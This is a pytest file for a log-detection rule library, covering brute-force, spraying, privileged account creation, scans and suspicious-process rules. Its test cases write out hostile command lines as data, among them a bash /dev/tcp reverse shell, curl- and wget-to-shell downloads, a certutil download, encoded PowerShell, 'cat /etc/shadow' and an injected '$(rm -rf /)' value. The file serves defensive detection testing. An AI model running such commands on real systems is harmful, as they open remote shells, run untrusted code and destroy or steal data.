"""The rule library and the five evaluator kinds, without a database (brief §32 cases)."""

import time
from datetime import UTC, datetime, timedelta

import pytest

from app.demo.scenarios import SCENARIOS
from app.detection.evaluate import evaluate
from app.detection.events import DetectionEvent
from app.detection.library import get_library
from app.detection.model import Exclusion
from tests.detection_helpers import (
    T0,
    detect,
    ev,
    events_from_lines,
    failures,
    rule,
    run_library,
    shuffled,
)

# ---------- threshold (AUTH-001) ----------


def test_four_failures_do_not_alert() -> None:
    assert detect("AUTH-001", failures(4)) == []


def test_five_failures_within_the_window_alert() -> None:
    (detection,) = detect("AUTH-001", failures(5))
    assert detection.event_count == 5
    assert detection.group == {"source_ip": "203.0.113.45", "host": "web-01", "username": "root"}


def test_five_failures_spread_just_over_the_window_do_not_alert() -> None:
    # 5 failures over 5 min 1 s: no 5-minute window holds all five.
    assert detect("AUTH-001", failures(5, every=75.25)) == []


def test_exactly_five_minutes_apart_is_inside_the_window() -> None:
    (detection,) = detect("AUTH-001", failures(5, every=75))
    assert detection.last_seen - detection.first_seen == timedelta(minutes=5)


def test_a_burst_is_one_detection_with_all_its_evidence() -> None:
    (detection,) = detect("AUTH-001", failures(40, every=10))
    assert detection.event_count == 40


def test_a_quiet_gap_starts_a_new_detection() -> None:
    events = failures(6) + failures(6, start=3600)
    assert [d.event_count for d in detect("AUTH-001", events)] == [6, 6]


def test_failures_from_different_sources_are_not_added_together() -> None:
    events = failures(3) + failures(3, source_ip="198.51.100.9")
    assert detect("AUTH-001", events) == []


def test_other_services_and_successes_do_not_count() -> None:
    events = failures(5, service="nginx") + failures(5, event_outcome="success")
    assert detect("AUTH-001", events) == []


def test_events_without_a_grouping_value_are_skipped_not_lumped_together() -> None:
    assert detect("AUTH-001", failures(10, source_ip=None)) == []


# ---------- sequence (AUTH-002) ----------


def success(seconds: float, **fields: object) -> DetectionEvent:
    return ev(seconds, event_outcome="success", **fields)


def test_success_right_after_failures_is_detected_with_every_failure_as_evidence() -> None:
    events = [*failures(8, every=5), success(60)]
    (detection,) = detect("AUTH-002", events)
    assert detection.facts["failures_count"] == 8
    assert detection.facts["success_count"] == 1
    assert detection.event_count == 9
    assert detection.facts["gap"] == 25  # seconds between the last failure and the success


def test_success_hours_later_is_not_this_pattern() -> None:
    assert detect("AUTH-002", [*failures(8, every=5), success(3 * 3600)]) == []


def test_success_more_than_five_minutes_after_the_last_failure_is_not_detected() -> None:
    # Still inside the 10-minute window, but beyond max_gap.
    assert detect("AUTH-002", [*failures(3, every=5), success(10 + 301)]) == []


def test_success_before_the_failures_is_not_detected() -> None:
    assert detect("AUTH-002", [success(0), *failures(5, start=10, every=5)]) == []


def test_too_few_failures_are_not_enough() -> None:
    assert detect("AUTH-002", [*failures(2), success(30)]) == []


def test_failures_are_not_reused_for_a_second_success() -> None:
    events = [*failures(5, every=5), success(30), success(90)]
    assert len(detect("AUTH-002", events)) == 1


def test_sequence_works_for_windows_and_application_logons_too() -> None:
    windows = [
        *failures(4, source_type="windows_security", service=None, host="ws-042"),
        success(50, source_type="windows_security", service=None, host="ws-042"),
    ]
    assert len(detect("AUTH-002", windows)) == 1


# ---------- sequence (ACCT-001) ----------


def test_account_created_then_added_to_a_privileged_group() -> None:
    created = ev(
        0,
        event_category="iam",
        event_action="user_created",
        event_outcome="success",
        target_username="svc-backup2",
        username=None,
        source_ip=None,
    )
    added = ev(
        2,
        event_category="iam",
        event_action="group_member_added",
        event_outcome="success",
        target_username="svc-backup2",
        username=None,
        source_ip=None,
        attributes={"group_name": "sudo"},
    )
    (detection,) = detect("ACCT-001", [created, added])
    assert 'added to the privileged group "sudo"' in detection.explanation


def test_windows_links_creation_and_group_add_by_sid() -> None:
    sid = "S-1-5-21-1-2-3-1105"
    created = ev(
        0,
        event_category="iam",
        event_action="user_created",
        event_outcome="success",
        target_username="helpdesk2",
        attributes={"target_sid": sid},
        host="ws-042",
    )
    added = ev(
        5,
        event_category="iam",
        event_action="group_member_added",
        event_outcome="success",
        target_username=None,
        host="ws-042",
        attributes={"target_sid": sid, "group_name": "Administrators"},
    )
    assert len(detect("ACCT-001", [created, added])) == 1


@pytest.mark.parametrize(
    ("group", "delay"),
    [("users", 2), ("sudo", 2 * 3600)],
    ids=["unprivileged-group", "too-late"],
)
def test_ordinary_groups_or_late_additions_do_not_count(group: str, delay: int) -> None:
    created = ev(
        0,
        event_category="iam",
        event_action="user_created",
        event_outcome="success",
        target_username="newuser",
    )
    added = ev(
        delay,
        event_category="iam",
        event_action="group_member_added",
        event_outcome="success",
        target_username="newuser",
        attributes={"group_name": group},
    )
    assert detect("ACCT-001", [created, added]) == []


# ---------- distinct (AUTH-003, NET-001) ----------


def spray(accounts: int) -> list[DetectionEvent]:
    return [ev(i * 20, username=f"user{i}", source_ip="198.51.100.23") for i in range(accounts)]


def test_four_accounts_do_not_alert_five_do() -> None:
    assert detect("AUTH-003", spray(4)) == []
    (detection,) = detect("AUTH-003", spray(5))
    assert detection.facts["distinct_count"] == 5
    assert detection.facts["values_sample"] == "user0, user1, user2, user3, user4"


def test_many_failures_for_one_account_are_not_spraying() -> None:
    assert detect("AUTH-003", failures(30)) == []


def distributed(sources: int, **fields: object) -> list[DetectionEvent]:
    """Three failures per source for one account: each source stays under AUTH-001."""
    return [
        ev(i * 20 + attempt * 4, username="deploy", source_ip=f"203.0.113.{100 + i}", **fields)
        for i in range(sources)
        for attempt in range(3)
    ]


def test_one_account_from_four_sources_does_not_alert_five_do() -> None:
    assert detect("AUTH-005", distributed(4)) == []
    (detection,) = detect("AUTH-005", distributed(5))
    assert detection.facts["distinct_count"] == 5
    assert detection.group == {"username": "deploy"}
    assert detection.event_count == 15
    assert detect("AUTH-001", distributed(8)) == []  # the gap AUTH-005 closes


def test_distributed_attempts_on_names_that_do_not_exist_are_left_to_auth_003() -> None:
    assert detect("AUTH-005", distributed(8, attributes={"invalid_user": True})) == []
    assert len(detect("AUTH-005", distributed(8, attributes={"invalid_user": False}))) == 1


def test_one_source_or_many_accounts_is_not_a_distributed_attack() -> None:
    assert detect("AUTH-005", failures(30)) == []
    assert detect("AUTH-005", spray(8)) == []


def test_sources_spread_beyond_the_window_do_not_alert() -> None:
    slow = [ev(i * 180, username="deploy", source_ip=f"203.0.113.{i}") for i in range(8)]
    assert detect("AUTH-005", slow) == []  # one new source every 3 min: 4 per 10 min


def scan(ports: int, every: float = 1, **fields: object) -> list[DetectionEvent]:
    base: dict[str, object] = {
        "event_category": "network",
        "event_action": "connection",
        "event_outcome": "failure",
        "source_ip": "10.0.2.42",
        "source_ip_scope": "internal",
        "destination_ip": "10.0.1.20",
        "service": None,
    }
    return [
        ev(
            i * every,
            destination_port=1000 + i,
            **(base | fields),
        )
        for i in range(ports)
    ]


def test_network_scan_needs_twenty_destinations_within_a_minute() -> None:
    assert detect("NET-001", scan(19)) == []
    assert len(detect("NET-001", scan(20))) == 1
    assert detect("NET-001", scan(20, every=4)) == []  # 76 s for 20 ports


def test_scans_from_outside_are_not_this_rule() -> None:
    assert detect("NET-001", scan(30, source_ip_scope="external")) == []


# ---------- new_value (AUTH-004) ----------


def logon(seconds: float, ip: str, user: str = "alice") -> DetectionEvent:
    return ev(seconds, event_outcome="success", username=user, source_ip=ip)


def history(
    days: int, ip: str = "10.0.2.41"
) -> dict[tuple[object, ...], list[tuple[datetime, object]]]:
    return {("alice",): [(T0 - timedelta(days=d), ip) for d in range(1, days + 1)]}


def test_logon_from_a_known_network_is_not_unusual() -> None:
    assert detect("AUTH-004", [logon(0, "10.0.2.99")], history=history(6)) == []


def test_logon_from_a_new_network_is_detected() -> None:
    (detection,) = detect("AUTH-004", [logon(0, "203.0.113.200")], history=history(6))
    assert detection.facts["value"] == "203.0.113.0/24"
    assert detection.facts["history_count"] == 6


def test_accounts_without_enough_history_are_not_judged() -> None:
    assert detect("AUTH-004", [logon(0, "203.0.113.200")], history=history(4)) == []


def test_history_older_than_the_lookback_does_not_count() -> None:
    old = {("alice",): [(T0 - timedelta(days=20 + d), "10.0.2.41") for d in range(10)]}
    assert detect("AUTH-004", [logon(0, "203.0.113.200")], history=old) == []


def test_a_new_network_is_reported_once_per_run() -> None:
    events = [logon(0, "203.0.113.200"), logon(60, "203.0.113.201")]
    assert len(detect("AUTH-004", events, history=history(6))) == 1


# ---------- single (PRIV-001, PROC-001) ----------


def sudo(command: str, outcome: str = "success", **fields: object) -> DetectionEvent:
    return ev(
        0,
        event_category="privilege",
        event_action="sudo",
        event_outcome=outcome,
        username="deploy",
        target_username="root",
        command_line=command,
        service="sudo",
        **fields,
    )


@pytest.mark.parametrize(
    "command", ["/bin/bash", "/usr/bin/su", "/usr/bin/su -", "/bin/sh -l", "su"]
)
def test_root_shell_through_sudo(command: str) -> None:
    (detection,) = detect("PRIV-001", [sudo(command)])
    assert detection.indicator == "root_shell"
    assert detection.confidence == "low"


@pytest.mark.parametrize(
    "command",
    ["/usr/bin/systemctl restart app", "/bin/bash /opt/deploy.sh", "/usr/bin/apt upgrade"],
)
def test_ordinary_sudo_commands_are_not_escalation(command: str) -> None:
    assert detect("PRIV-001", [sudo(command)]) == []


def test_sudo_by_a_user_not_in_sudoers() -> None:
    event = sudo(
        "/usr/bin/cat /etc/shadow",
        outcome="failure",
        attributes={"failure_reason": "not_in_sudoers"},
    )
    (detection,) = detect("PRIV-001", [event])
    assert (detection.indicator, detection.confidence) == ("not_in_sudoers", "medium")


# base64 of UTF-16LE "Write-Output 'simulated'", the form -EncodedCommand takes
ENCODED = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAaQBtAHUAbABhAHQAZQBkACcA"


def process(command: str, name: str = "powershell.exe") -> DetectionEvent:
    return ev(
        0,
        event_category="process",
        event_action="process_started",
        event_outcome="success",
        process_name=name,
        command_line=command,
        username="alice",
        host="ws-042",
        source_ip=None,
        service=None,
    )


@pytest.mark.parametrize(
    ("command", "name", "indicator", "techniques"),
    [
        (
            "powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi",
            "powershell.exe",
            "encoded_powershell",
            {"T1059.001", "T1027.010"},
        ),
        (
            "pwsh -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBi",
            "pwsh",
            "encoded_powershell",
            {"T1059.001", "T1027.010"},
        ),
        (
            "curl -s https://example.invalid/x.sh | bash",
            "bash",
            "download_pipe_shell",
            {"T1105", "T1059.004"},
        ),
        (
            "certutil.exe -urlcache -split -f http://example.invalid/a.exe a.exe",
            "certutil.exe",
            "certutil_download",
            {"T1105"},
        ),
        ("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1", "bash", "dev_tcp_shell", {"T1059.004"}),
        (
            "C:\\Users\\Public\\svc.exe -NoP -e " + ENCODED,
            "svc.exe",
            "encoded_powershell",
            {"T1059.001", "T1027.010"},
        ),
        (
            "powershell.exe -ec:" + ENCODED,
            "powershell.exe",
            "encoded_powershell",
            {"T1059.001", "T1027.010"},
        ),
        (
            "powershell.exe \u2013enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi",
            "powershell.exe",
            "encoded_powershell",
            {"T1059.001", "T1027.010"},
        ),
        (
            "bash <(curl -s https://example.invalid/x.sh)",
            "bash",
            "download_pipe_shell",
            {"T1105", "T1059.004"},
        ),
        (
            'sh -c "$(wget -qO- https://example.invalid/x.sh)"',
            "sh",
            "download_pipe_shell",
            {"T1105", "T1059.004"},
        ),
        (
            "curl -so /tmp/x.sh https://example.invalid/x.sh && bash /tmp/x.sh",
            "bash",
            "download_pipe_shell",
            {"T1105", "T1059.004"},
        ),
    ],
    ids=[
        "enc",
        "encodedcommand",
        "curl-pipe",
        "certutil",
        "dev-tcp",
        "renamed-powershell",
        "colon-syntax",
        "en-dash",
        "process-substitution",
        "command-substitution",
        "download-then-run",
    ],
)
def test_suspicious_command_indicators(
    command: str, name: str, indicator: str, techniques: set[str]
) -> None:
    (detection,) = detect("PROC-001", [process(command, name)])
    assert detection.indicator == indicator
    assert {m.technique for m in detection.mitre} == techniques


@pytest.mark.parametrize(
    ("command", "name"),
    [
        ("powershell.exe -File C:\\scripts\\backup.ps1", "powershell.exe"),
        ("powershell.exe -ExecutionPolicy Bypass -File x.ps1", "powershell.exe"),
        ("curl -o /tmp/release.tar.gz https://example.invalid/release.tar.gz", "curl"),
        ("notepad.exe notes.txt", "notepad.exe"),
        # Download then something other than a shell; a shell then no download.
        ("curl -o /tmp/r.tar.gz https://example.invalid/r.tar.gz && tar xzf /tmp/r.tar.gz", "sh"),
        ("bash -c 'echo $(date)'", "bash"),
        # Base64 that is not UTF-16 text: tokens, keys, UTF-8 payloads.
        (
            "curl -H 'Authorization: Bearer c2VjcmV0LXRva2VuLWZvci10ZXN0cy1vbmx5LW5vdC1yZWFs'",
            "curl",
        ),
        ("grep -e QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo= log.txt", "grep"),
    ],
)
def test_ordinary_commands_are_not_suspicious(command: str, name: str) -> None:
    assert detect("PROC-001", [process(command, name)]) == []


@pytest.mark.parametrize(
    "command",
    [
        "powershell.exe " + "-e " * 3000,
        "curl " + "a" * 7000 + " | x",
        "curl " + "|" * 7000,
        "curl " * 1600,
        "bash $(" * 1100,
        "AQAA" * 2000,
        "curl " + "a" * 7000 + " && x",
    ],
    ids=[
        "many-flags",
        "long-curl",
        "many-pipes",
        "many-curls",
        "many-subst",
        "utf16-ish",
        "long-and",
    ],
)
def test_indicator_patterns_run_in_linear_time(command: str) -> None:
    started = time.perf_counter()
    detect("PROC-001", [process(command)])
    assert time.perf_counter() - started < 0.5


# ---------- behaviour common to every kind ----------


def test_input_order_does_not_change_the_result() -> None:
    events = [*failures(8, every=5), success(60), *spray(6)]
    for rule_id in ("AUTH-001", "AUTH-002", "AUTH-003"):
        in_order = [d.evidence_event_ids for d in detect(rule_id, events)]
        assert [d.evidence_event_ids for d in detect(rule_id, shuffled(events))] == in_order


def test_exclusions_silence_a_known_source() -> None:
    definition = rule("AUTH-001").model_copy(
        update={"exclusions": [Exclusion(field="source_ip", value="203.0.113.0/24")]}
    )
    assert evaluate(definition, failures(10)) == []
    assert len(evaluate(definition, failures(10, source_ip="198.51.100.9"))) == 1


def test_explanation_is_built_from_the_evidence() -> None:
    (detection,) = detect("AUTH-001", failures(7, every=10))
    assert detection.explanation.startswith(
        '7 failed SSH logons for "root" on web-01 from 203.0.113.45 (external) within 1 min'
    )
    assert "2026-09-25 10:00:00 UTC" in detection.explanation
    assert "alerts at 5 failures within 5 min" in detection.explanation
    assert "$" not in detection.explanation + " ".join(detection.investigation)
    assert detection.investigation[0] == (
        "Check whether 203.0.113.45 has any successful logon on web-01 after "
        "2026-09-25 10:00:00 UTC."
    )


def test_evidence_list_is_capped_but_the_count_is_exact() -> None:
    (detection,) = detect("AUTH-001", failures(250, every=1))
    assert detection.event_count == 250
    assert len(detection.evidence_event_ids) == 100


def test_values_from_logs_stay_inert_text_in_explanations() -> None:
    hostile = "$(rm -rf /)<script>${rule_id}"
    (detection,) = detect("AUTH-001", failures(5, username=hostile))
    assert hostile in detection.explanation  # inserted once, as text, not re-expanded


# ---------- the demo scenarios trigger exactly their documented rules ----------


@pytest.mark.parametrize("name", sorted(SCENARIOS))
def test_each_demo_scenario_triggers_exactly_its_rules(name: str) -> None:
    scenario = SCENARIOS[name]
    start = datetime(2026, 9, 25, 9, 0, tzinfo=UTC)
    events = events_from_lines(scenario.source_type, scenario.build(start))
    assert events, "the scenario must parse"
    assert set(run_library(events)) == set(scenario.expected_rules)


def test_every_rule_is_exercised_by_a_demo_scenario() -> None:
    covered = {rule_id for s in SCENARIOS.values() for rule_id in s.expected_rules}
    # AUTH-004 needs 14 days of history; it is exercised by its own tests above.
    assert set(get_library().rules) - covered == {"AUTH-004"}
